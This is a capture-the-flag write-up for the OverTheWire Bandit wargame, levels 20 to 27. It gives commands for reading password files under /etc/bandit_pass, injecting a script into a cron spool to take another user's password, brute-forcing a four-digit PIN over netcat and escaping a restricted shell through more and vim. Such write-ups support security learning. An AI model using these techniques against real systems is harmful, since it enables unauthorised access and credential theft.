# Bandit CTF Writeups: Levels 20 to 26

OverTheWire Bandit wargame solutions — objectives, commands, and notes.

**Host:** `bandit.labs.overthewire.org` | **Port:** `2220`

---

## Level 20 → 21

A setuid binary `suconnect` connects to a port you specify, reads a password, and returns the next one if it matches.

```bash
echo "bandit20_password" | nc -l -p 4444 &
./suconnect 4444
```

The `&` backgrounds the listener so you can run `suconnect` in the same terminal.

---

## Level 21 → 22

A cron job runs as bandit22 every minute and writes the password to a world-readable `/tmp` file.

```bash
ls -la /etc/cron.d/
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

---

## Level 22 → 23

A cron job runs as bandit23 and writes the password to `/tmp/<md5hash>`. Reproduce the hash to find the filename.

```bash
cat /usr/bin/cronjob_bandit23.sh
mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
cat /tmp/$mytarget
```

Write `bandit23` as a plain string — `$bandit23` expands to nothing.

---

## Level 23 → 24

A cron job runs as bandit24 and executes any script in `/var/spool/bandit24/foo` owned by bandit23, then deletes it.

```bash
mktemp -d
chmod 777 /tmp/tmp.XXXXXX
cd /tmp/tmp.XXXXXX
nano test.sh
```

Contents of `test.sh`:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.XXXXXX/pwd24.txt
```

```bash
chmod +x test.sh
cp test.sh /var/spool/bandit24/foo
# wait up to a minute, then:
cat /tmp/tmp.XXXXXX/pwd24.txt
```

`chmod 777` on your tmp dir is required so bandit24 can write the output file back.

---

## Level 24 → 25

A daemon on port 30002 requires the bandit24 password plus a secret 4-digit PIN. Brute-force all 10000 combinations.

```bash
for i in {0000..9999}; do
    echo "bandit24_password $i"
done | nc localhost 30002 | grep -vi "wrong"
```

All combinations are piped into a single `nc` connection. `grep -vi "wrong"` filters failed attempts, leaving the success line.

---

## Level 25 → 26

bandit26's login shell is a script that runs `more ~/text.txt` and exits immediately — unless the terminal is too small to display the file at once.

```bash
grep bandit26 /etc/passwd
cat /usr/bin/showtext
```

Shrink your terminal window vertically so `more` is forced into pager mode, then SSH in.

```bash
ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
```

Inside `more`, press `v` to open vim, then escape to a shell:

```
:set shell=/bin/bash
:shell
```

---

## Level 26 → 27

Same setuid pattern as level 19→20. The binary `bandit27-do` runs as bandit27.

```bash
./bandit27-do cat /etc/bandit_pass/bandit27
```